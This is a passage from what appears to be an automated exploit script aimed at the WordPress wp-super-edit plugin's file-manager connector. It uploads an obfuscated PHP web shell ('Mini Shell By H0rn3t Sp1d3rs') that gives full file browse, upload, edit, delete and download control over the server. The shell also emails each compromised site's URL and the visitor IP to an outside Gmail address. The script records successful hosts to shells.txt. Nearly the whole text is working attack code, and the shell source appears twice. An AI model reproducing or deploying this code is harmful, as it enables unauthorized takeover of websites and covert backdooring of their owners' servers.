	<style>.table-hover tbody tr:hover td{background:#00BFFF}.table-hover tbody tr:hover td>*{color:#fff}.table>tbody>tr>*{color:#fff;vertical-align:middle}.form-control{background:0 0!important;color:#fff!important;border-radius:0}.form-control::placeholder{color:#fff;opacity:1}li{font-size:18px;margin-left:6px;list-style:none}a{color:#fff}</style>
	<script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
	<script src='https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js' type='text/javascript' /></script>
</head>
<body style="background-color:#000;color:#fff;font-family:serif;">
	<div class="bg-dark table-responsive text-light border">
		<div class="d-flex justify-content-between p-1">
			<div><h3 class="mt-2"><a href="?"><?= Yp; ?></a></h3></div>
		</div>
		<div class="border-top table-responsive">
			<li>PHP: <?= php_uname(); ?></li>
			<li>Doc Root: <?= "{$_SERVER["DOCUMENT_ROOT"]}"; ?></li>
			<li>Server: <?= "{$_SERVER["SERVER_ADDR"]}/{$_SERVER["REMOTE_ADDR"]}"; ?></li>
			<li>Domain : <?= "{$_SERVER["SERVER_NAME"]}"; ?></li>
			<li>Ip Server: <?= getHostByName(getHostName()); ?></li>
			<li>php Version: <?= phpversion(); ?></li>
			<li>Mysql: <?= (function_exists('mysql_connect')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>"; ?></li>
			<li>Curl: <?= (function_exists('curl_version')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>"; ?></li>
		</div>
		<form method="post" enctype="multipart/form-data"><div class="input-group mb-1 px-1 mt-1"><div class="custom-file"><input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple><label class="custom-file-label rounded-0 bg-transparent text-light">Choose file</label></div></div></form>
		<?php  if (!isset($_FILES["f"])) { goto ea; } $Wx = $_FILES["f"]["name"]; $lE = 0; th: if (!($lE < count($Wx))) { goto dx; } if ($c8[11]($_FILES["f"]["tmp_name"][$lE], $Wx[$lE])) { goto PG; } Xe("file failed to upload", 0); goto tG; PG: XE("file uploaded successfully"); tG: g9: $lE++; goto th; dx: ea: if (!isset($_GET["download"])) { goto FA; } header("Content-Type: application/octet-stream"); header("Content-Transfer-Encoding: Binary"); header("Content-Length: " . $c8[17](JD($_GET["n"]))); header("Content-disposition: attachment; filename=\"" . jd($_GET["n"]) . "\""); FA: ?>
				<a href="?p=<?= ss($Jd) . "&a=" . Ss("newFile"); ?>"> [ Add New File ] </a>
				<a href="?p=<?= Ss($Jd) . "&a=" . sS("newDir"); ?>"> [ Add New Directory ] </a>
			</div>
	<div class="bg-dark border table-responsive mt-2">
		<div class="ml-2" style="font-size:18px;">
			<span>Path: </span>
			<?php  $Op = $c8[4]("/(\\\\|\\/)/", $Jd); foreach ($Op as $j3 => $Oe) { if (!($j3 == 0 && $Oe == "")) { goto xi; } echo "<a href=\"?p=2f\">~</a>/"; goto CS; xi: if (!($Oe == "")) { goto sq; } goto CS; sq: echo "<a href=\"?p="; $lE = 0; de: if (!($lE <= $j3)) { goto ie; } echo sS($Op[$lE]); if (!($lE != $j3)) { goto s0; } echo "2f"; s0: dg: $lE++; goto de; ie: echo "\">{$Oe}</a>/"; CS: } Go: ?>
		</div>
	</div>
	<article class="bg-dark border table-responsive mt-2">
		<?php  if (!isset($_GET["a"])) { goto Un; } if (!isset($_GET["a"])) { goto cc; } $im = Jd($_GET["a"]); cc: ?>
		<div class="px-2 py-2">
			<?php  if (!($im == "delete")) { goto Lu; } $BL = $Jd . '/' . Jd($_GET["n"]); if (!($_GET["t"] == "d")) { goto VZ; } TF($BL); if (!$c8[12]($BL)) { goto e8; } Xe("failed to delete the folder", 0); goto iL; e8: Xe("folder deleted successfully"); iL: VZ: if (!($_GET["t"] == "f")) { goto xB; } $BL = $Jd . '/' . jd($_GET["n"]); unlink($BL); if (!$c8[12]($BL)) { goto uH; } Xe("file to delete the folder", 0); goto Mk; uH: xe("file deleted successfully"); Mk: xB: Lu: ?>
			<?php  if ($im == "newDir") { goto Fg; } if ($im == "newFile") { goto Pb; } if ($im == "rename") { goto Lw; } if ($im == "edit") { goto Ox; } if ($im == "view") { goto Ag; } goto WC; Fg: ?>
			<h5 class="border p-1 mb-3">New folder</h5>
			<form method="post"><div class="form-group"><label for="n">Name :</label><input name="n" id="n" class="form-control" autocomplete="off"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
			<?php  isset($_POST["s"]) ? $c8[12]("{$Jd}/{$_POST["n"]}") ? xE("folder name has been used", 0, "&a=" . SS("newDir")) : ($c8[15]("{$Jd}/{$_POST["n"]}") ? Xe("folder created successfully") : Xe("folder failed to create", 0)) : null; goto WC; Pb: ?>
			<h5 class="border p-1 mb-3">New file</h5>
			<form method="post"><div class="form-group"><label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt"></div><div class="form-group"><label for="ctn">Content :</label><textarea style="resize:none" name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Hacked By Mr.7Mind"></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
			<?php  isset($_POST["s"]) ? $c8[12]("{$Jd}/{$_POST["n"]}") ? xE("file name has been used", 0, "&a=" . SS("newFile")) : ($c8[13]("{$Jd}/{$_POST["n"]}", $_POST["ctn"]) ? XE("file created successfully", 1, "&a=" . ss("view") . "&n=" . Ss($_POST["n"])) : Xe("file failed to create", 0)) : null; goto WC; Lw: ?>
			<h5 class="border p-1 mb-3">Rename <?= $_GET["t"] == "d" ? "folder" : "file"; ?></h5>
			<form method="post"><div class="form-group"><label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?= jD($_GET["n"]); ?>"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
			<?php  isset($_POST["s"]) ? $c8[16]($Jd . '/' . jD($_GET["n"]), $_POST["n"]) ? XE("successfully changed the folder name") : Xe("failed to change the folder name", 0) : null; goto WC; Ox: ?>
			<h5 class="border p-1 mb-3">Edit file</h5>
			<span>File name : <?= Jd($_GET["n"]); ?></span>
			<form method="post"><div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?= $c8[18]($c8[14]($Jd . '/' . jD($_GET["n"]))); ?></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
			<?php  isset($_POST["s"]) ? $c8[13]($Jd . '/' . jD($_GET["n"]), $_POST["ctn"]) ? xE("file contents changed successfully", 1, "&a=" . sS("view") . "&n={$_GET["n"]}") : xE("file contents failed to change") : null; goto WC; Ag: ?>
			<h5 class="border p-1 mb-3">View file</h5>
			<span>File name : <?= jd($_GET["n"]); ?></span>
			<div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" readonly><?= $c8[18]($c8[14]($Jd . '/' . jd($_GET["n"]))); ?></textarea></div>
			<?php  WC: ?>
		</div>
		<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'ribelcyberteam@gmail.com, ribelcyberteam@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "Hehehe", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
		<?php  goto mR; Un: ?>
		<table class="table table-hover table-bordered table-sm">
			<thead class="text-light">
				<tr>
					<th>Name</th>
					<th>Size</th>
					<th>Permission</th>
					<th>Action</th>
				</tr>
			</thead>
			<tbody class="text-light">
				<?php  $G3 = $c8[5]($G3($Jd), [".", ".."]); foreach ($G3 as $yf) { if ($c8[6]("{$Jd}/{$yf}")) { goto CB; } goto Qj; CB: echo "\n\t\t\t\t\t<tr>\n\t\t\t\t\t\t<td><a href=\"?p=" . sS("{$Jd}/{$yf}") . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$yf}")) . "\"><i class=\"fa fa-fw fa-folder\"></i> {$yf}</a></td>\n\t\t\t\t\t\t<td>N/A</td>\n\t\t\t\t\t\t<td><font color=\"" . ($c8[8]("{$Jd}/{$yf}") ? "#00ff00" : (!$c8[9]("{$Jd}/{$yf}") ? "red" : null)) . "\">" . RN("{$Jd}/{$yf}") . "</font></td>\n\t\t\t\t\t\t<td>\n\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&a=" . ss("rename") . "&n=" . ss($yf) . "&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n\t\t\t\t\t\t\t<a href=\"?p=" . sS($Jd) . "&a=" . ss("delete") . "&n=" . ss($yf) . "\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n\t\t\t\t\t\t</td>\n\t\t\t\t\t</tr>"; Qj: } ad: foreach ($G3 as $F1) { if ($c8[7]("{$Jd}/{$F1}")) { goto wA; } goto X1; wA: $kL = $c8[10]("{$Jd}/{$F1}") / 1024; $kL = round($kL, 3); $kL = $kL > 1024 ? round($kL / 1024, 2) . "MB" : $kL . "KB"; echo "\n\t\t\t\t\t<tr>\n\t\t\t\t\t\t<td><a href=\"?p=" . SS($Jd) . "&a=" . sS("view") . "&n=" . SS($F1) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$F1}")) . "\"><i class=\"fa fa-fw fa-file\"></i> {$F1}</a></td>\n\t\t\t\t\t\t<td>{$kL}</td>\n\t\t\t\t\t\t<td><font color=\"" . ($c8[8]("{$Jd}/{$F1}") ? "#00ff00" : (!$c8[9]("{$Jd}/{$F1}") ? "red" : null)) . "\">" . rN("{$Jd}/{$F1}") . "</font></td>\n\t\t\t\t\t\t<td>\n\t\t\t\t\t\t\t<div class=\"d-flex justify-content-between\">\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . Ss($Jd) . "&a=" . Ss("edit") . "&n=" . SS($F1) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fa fa-fw fa-edit\"></i></a>\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&a=" . SS("rename") . "&n=" . ss($F1) . "&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&n=" . sS($F1) . "&download" . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Download\"><i class=\"fa fa-fw fa-download\"></i></a>\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&a=" . sS("delete") . "&n=" . ss($F1) . "\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t</td>\n\t\t\t\t\t</tr>\n\t\t\t\t\t"; X1: } a2: ?>
			</tbody>
		</table>
		<?php  mR: ?>
	</article>
	<div class="bg-dark border text-center mt-2">
		<small></small>
	</div>
	<script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script>
	<script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" ></script>
	<script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script>
	<script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))</script>
</body>
</html>

------WebKitFormBoundary5bvq7vh5W2anjxf6--"""
        che = requests.post(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/connectors/test.html',headers=headers,data=data,allow_redirects=True,timeout=15)
        check = requests.get(url+'wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/connectors/x.php',headers=headers, allow_redirects=True,timeout=15)
        if ("mini shell by h0rn3t sp1d3rs" in check.content.decode("utf-8")):
                print (' [#] Exploit 148 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + 'wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/connectors/x.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            data="""------WebKitFormBoundary5bvq7vh5W2anjxf6

Content-Disposition: form-data; name="NewFile"; filename="x.php"

Content-Type: application/octet-stream



<?php
/*
exploit by h0rn3t sp1d3rs 
*/
error_reporting(0); http_response_code(404); define("Yp", " Mini Shell By H0rn3t Sp1d3rs "); $G3 = "scandir"; $c8 = array("7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65"); $lE = 0; T4: if (!($lE < count($c8))) { goto Je; } $c8[$lE] = JD($c8[$lE]); Cy: $lE++; goto T4; Je: if (isset($_GET["p"])) { goto sr; } $Jd = $c8[2](); goto VN; sr: $Jd = jD($_GET["p"]); $c8[3](Jd($_GET["p"])); VN: function Ss($SP) { $dE = ""; $lE = 0; NZ: if (!($lE < strlen($SP))) { goto Xc; } $dE .= dechex(ord($SP[$lE])); WK: $lE++; goto NZ; Xc: return $dE; } function Jd($SP) { $dE = ""; $gf = strlen($SP) - 1; $lE = 0; Xp: if (!($lE < $gf)) { goto ur; } $dE .= chr(hexdec($SP[$lE] . $SP[$lE + 1])); Wn: $lE += 2; goto Xp; ur: return $dE; } function rn($F1) { $Jd = fileperms($F1); if (($Jd & 0xc000) == 0xc000) { goto FZ; } if (($Jd & 0xa000) == 0xa000) { goto Eu; } if (($Jd & 0x8000) == 0x8000) { goto ES; } if (($Jd & 0x6000) == 0x6000) { goto sA; } if (($Jd & 0x4000) == 0x4000) { goto lG; } if (($Jd & 0x2000) == 0x2000) { goto tV; } if (($Jd & 0x1000) == 0x1000) { goto Tx; } $lE = 'u'; goto cC; FZ: $lE = 's'; goto cC; Eu: $lE = 'l'; goto cC; ES: $lE = '-'; goto cC; sA: $lE = 'b'; goto cC; lG: $lE = 'd'; goto cC; tV: $lE = 'c'; goto cC; Tx: $lE = 'p'; cC: $lE .= $Jd & 0x100 ? 'r' : '-'; $lE .= $Jd & 0x80 ? 'w' : '-'; $lE .= $Jd & 0x40 ? $Jd & 0x800 ? 's' : 'x' : ($Jd & 0x800 ? 'S' : '-'); $lE .= $Jd & 0x20 ? 'r' : '-'; $lE .= $Jd & 0x10 ? 'w' : '-'; $lE .= $Jd & 0x8 ? $Jd & 0x400 ? 's' : 'x' : ($Jd & 0x400 ? 'S' : '-'); $lE .= $Jd & 0x4 ? 'r' : '-'; $lE .= $Jd & 0x2 ? 'w' : '-'; $lE .= $Jd & 0x1 ? $Jd & 0x200 ? 't' : 'x' : ($Jd & 0x200 ? 'T' : '-'); return $lE; } function Xe($OB, $Ch = 1, $BL = "") { global $Jd; $xe = $Ch == 1 ? "success" : "error"; echo "<script>swal({title: \"{$xe}\", text: \"{$OB}\", icon: \"{$xe}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=" . Ss($Jd) . $BL . "\"}})</script>"; } function tF($yf) { global $c8; if (!(trim(pathinfo($yf, PATHINFO_BASENAME), '.') === '')) { goto IE; } return; IE: if ($c8[6]($yf)) { goto PF; } unlink($yf); goto jK; PF: array_map("deldir", glob($yf . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT)); rmdir($yf); jK: } ?>
<!doctype html>
<!-- Mr.7Mind -->
<html lang="en">
<head>
	<meta name="theme-color" content="#00BFFF">
	<meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
	<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	<title>Shell Bypass By H0rn3t Sp1d3rs</title>
	<style>.table-hover tbody tr:hover td{background:#00BFFF}.table-hover tbody tr:hover td>*{color:#fff}.table>tbody>tr>*{color:#fff;vertical-align:middle}.form-control{background:0 0!important;color:#fff!important;border-radius:0}.form-control::placeholder{color:#fff;opacity:1}li{font-size:18px;margin-left:6px;list-style:none}a{color:#fff}</style>
	<script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
	<script src='https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js' type='text/javascript' /></script>
</head>
<body style="background-color:#000;color:#fff;font-family:serif;">
	<div class="bg-dark table-responsive text-light border">
		<div class="d-flex justify-content-between p-1">
			<div><h3 class="mt-2"><a href="?"><?= Yp; ?></a></h3></div>
		</div>
		<div class="border-top table-responsive">
			<li>PHP: <?= php_uname(); ?></li>
			<li>Doc Root: <?= "{$_SERVER["DOCUMENT_ROOT"]}"; ?></li>
			<li>Server: <?= "{$_SERVER["SERVER_ADDR"]}/{$_SERVER["REMOTE_ADDR"]}"; ?></li>
			<li>Domain : <?= "{$_SERVER["SERVER_NAME"]}"; ?></li>
			<li>Ip Server: <?= getHostByName(getHostName()); ?></li>
			<li>php Version: <?= phpversion(); ?></li>
			<li>Mysql: <?= (function_exists('mysql_connect')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>"; ?></li>
			<li>Curl: <?= (function_exists('curl_version')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>"; ?></li>
		</div>
		<form method="post" enctype="multipart/form-data"><div class="input-group mb-1 px-1 mt-1"><div class="custom-file"><input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple><label class="custom-file-label rounded-0 bg-transparent text-light">Choose file</label></div></div></form>
		<?php  if (!isset($_FILES["f"])) { goto ea; } $Wx = $_FILES["f"]["name"]; $lE = 0; th: if (!($lE < count($Wx))) { goto dx; } if ($c8[11]($_FILES["f"]["tmp_name"][$lE], $Wx[$lE])) { goto PG; } Xe("file failed to upload", 0); goto tG; PG: XE("file uploaded successfully"); tG: g9: $lE++; goto th; dx: ea: if (!isset($_GET["download"])) { goto FA; } header("Content-Type: application/octet-stream"); header("Content-Transfer-Encoding: Binary"); header("Content-Length: " . $c8[17](JD($_GET["n"]))); header("Content-disposition: attachment; filename=\"" . jd($_GET["n"]) . "\""); FA: ?>
				<a href="?p=<?= ss($Jd) . "&a=" . Ss("newFile"); ?>"> [ Add New File ] </a>
				<a href="?p=<?= Ss($Jd) . "&a=" . sS("newDir"); ?>"> [ Add New Directory ] </a>
			</div>
	<div class="bg-dark border table-responsive mt-2">
		<div class="ml-2" style="font-size:18px;">
			<span>Path: </span>
			<?php  $Op = $c8[4]("/(\\\\|\\/)/", $Jd); foreach ($Op as $j3 => $Oe) { if (!($j3 == 0 && $Oe == "")) { goto xi; } echo "<a href=\"?p=2f\">~</a>/"; goto CS; xi: if (!($Oe == "")) { goto sq; } goto CS; sq: echo "<a href=\"?p="; $lE = 0; de: if (!($lE <= $j3)) { goto ie; } echo sS($Op[$lE]); if (!($lE != $j3)) { goto s0; } echo "2f"; s0: dg: $lE++; goto de; ie: echo "\">{$Oe}</a>/"; CS: } Go: ?>
		</div>
	</div>
	<article class="bg-dark border table-responsive mt-2">
		<?php  if (!isset($_GET["a"])) { goto Un; } if (!isset($_GET["a"])) { goto cc; } $im = Jd($_GET["a"]); cc: ?>
		<div class="px-2 py-2">
			<?php  if (!($im == "delete")) { goto Lu; } $BL = $Jd . '/' . Jd($_GET["n"]); if (!($_GET["t"] == "d")) { goto VZ; } TF($BL); if (!$c8[12]($BL)) { goto e8; } Xe("failed to delete the folder", 0); goto iL; e8: Xe("folder deleted successfully"); iL: VZ: if (!($_GET["t"] == "f")) { goto xB; } $BL = $Jd . '/' . jd($_GET["n"]); unlink($BL); if (!$c8[12]($BL)) { goto uH; } Xe("file to delete the folder", 0); goto Mk; uH: xe("file deleted successfully"); Mk: xB: Lu: ?>
			<?php  if ($im == "newDir") { goto Fg; } if ($im == "newFile") { goto Pb; } if ($im == "rename") { goto Lw; } if ($im == "edit") { goto Ox; } if ($im == "view") { goto Ag; } goto WC; Fg: ?>
			<h5 class="border p-1 mb-3">New folder</h5>
			<form method="post"><div class="form-group"><label for="n">Name :</label><input name="n" id="n" class="form-control" autocomplete="off"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
			<?php  isset($_POST["s"]) ? $c8[12]("{$Jd}/{$_POST["n"]}") ? xE("folder name has been used", 0, "&a=" . SS("newDir")) : ($c8[15]("{$Jd}/{$_POST["n"]}") ? Xe("folder created successfully") : Xe("folder failed to create", 0)) : null; goto WC; Pb: ?>
			<h5 class="border p-1 mb-3">New file</h5>
			<form method="post"><div class="form-group"><label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt"></div><div class="form-group"><label for="ctn">Content :</label><textarea style="resize:none" name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Hacked By Mr.7Mind"></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
			<?php  isset($_POST["s"]) ? $c8[12]("{$Jd}/{$_POST["n"]}") ? xE("file name has been used", 0, "&a=" . SS("newFile")) : ($c8[13]("{$Jd}/{$_POST["n"]}", $_POST["ctn"]) ? XE("file created successfully", 1, "&a=" . ss("view") . "&n=" . Ss($_POST["n"])) : Xe("file failed to create", 0)) : null; goto WC; Lw: ?>
			<h5 class="border p-1 mb-3">Rename <?= $_GET["t"] == "d" ? "folder" : "file"; ?></h5>
			<form method="post"><div class="form-group"><label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?= jD($_GET["n"]); ?>"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
			<?php  isset($_POST["s"]) ? $c8[16]($Jd . '/' . jD($_GET["n"]), $_POST["n"]) ? XE("successfully changed the folder name") : Xe("failed to change the folder name", 0) : null; goto WC; Ox: ?>
			<h5 class="border p-1 mb-3">Edit file</h5>
			<span>File name : <?= Jd($_GET["n"]); ?></span>
			<form method="post"><div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?= $c8[18]($c8[14]($Jd . '/' . jD($_GET["n"]))); ?></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
			<?php  isset($_POST["s"]) ? $c8[13]($Jd . '/' . jD($_GET["n"]), $_POST["ctn"]) ? xE("file contents changed successfully", 1, "&a=" . sS("view") . "&n={$_GET["n"]}") : xE("file contents failed to change") : null; goto WC; Ag: ?>
			<h5 class="border p-1 mb-3">View file</h5>
			<span>File name : <?= jd($_GET["n"]); ?></span>
			<div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" readonly><?= $c8[18]($c8[14]($Jd . '/' . jd($_GET["n"]))); ?></textarea></div>
			<?php  WC: ?>
		</div>
		<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'ribelcyberteam@gmail.com, ribelcyberteam@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "Hehehe", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
		<?php  goto mR; Un: ?>
		<table class="table table-hover table-bordered table-sm">
			<thead class="text-light">
				<tr>
					<th>Name</th>
					<th>Size</th>
					<th>Permission</th>
					<th>Action</th>
				</tr>
			</thead>
			<tbody class="text-light">
				<?php  $G3 = $c8[5]($G3($Jd), [".", ".."]); foreach ($G3 as $yf) { if ($c8[6]("{$Jd}/{$yf}")) { goto CB; } goto Qj; CB: echo "\n\t\t\t\t\t<tr>\n\t\t\t\t\t\t<td><a href=\"?p=" . sS("{$Jd}/{$yf}") . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$yf}")) . "\"><i class=\"fa fa-fw fa-folder\"></i> {$yf}</a></td>\n\t\t\t\t\t\t<td>N/A</td>\n\t\t\t\t\t\t<td><font color=\"" . ($c8[8]("{$Jd}/{$yf}") ? "#00ff00" : (!$c8[9]("{$Jd}/{$yf}") ? "red" : null)) . "\">" . RN("{$Jd}/{$yf}") . "</font></td>\n\t\t\t\t\t\t<td>\n\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&a=" . ss("rename") . "&n=" . ss($yf) . "&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n\t\t\t\t\t\t\t<a href=\"?p=" . sS($Jd) . "&a=" . ss("delete") . "&n=" . ss($yf) . "\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n\t\t\t\t\t\t</td>\n\t\t\t\t\t</tr>"; Qj: } ad: foreach ($G3 as $F1) { if ($c8[7]("{$Jd}/{$F1}")) { goto wA; } goto X1; wA: $kL = $c8[10]("{$Jd}/{$F1}") / 1024; $kL = round($kL, 3); $kL = $kL > 1024 ? round($kL / 1024, 2) . "MB" : $kL . "KB"; echo "\n\t\t\t\t\t<tr>\n\t\t\t\t\t\t<td><a href=\"?p=" . SS($Jd) . "&a=" . sS("view") . "&n=" . SS($F1) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$F1}")) . "\"><i class=\"fa fa-fw fa-file\"></i> {$F1}</a></td>\n\t\t\t\t\t\t<td>{$kL}</td>\n\t\t\t\t\t\t<td><font color=\"" . ($c8[8]("{$Jd}/{$F1}") ? "#00ff00" : (!$c8[9]("{$Jd}/{$F1}") ? "red" : null)) . "\">" . rN("{$Jd}/{$F1}") . "</font></td>\n\t\t\t\t\t\t<td>\n\t\t\t\t\t\t\t<div class=\"d-flex justify-content-between\">\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . Ss($Jd) . "&a=" . Ss("edit") . "&n=" . SS($F1) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fa fa-fw fa-edit\"></i></a>\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&a=" . SS("rename") . "&n=" . ss($F1) . "&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&n=" . sS($F1) . "&download" . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Download\"><i class=\"fa fa-fw fa-download\"></i></a>\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&a=" . sS("delete") . "&n=" . ss($F1) . "\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t</td>\n\t\t\t\t\t</tr>\n\t\t\t\t\t"; X1: } a2: ?>
			</tbody>
		</table>
		<?php  mR: ?>
	</article>
	<div class="bg-dark border text-center mt-2">
		<small></small>
	</div>
	<script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script>
	<script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" ></script>
	<script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script>
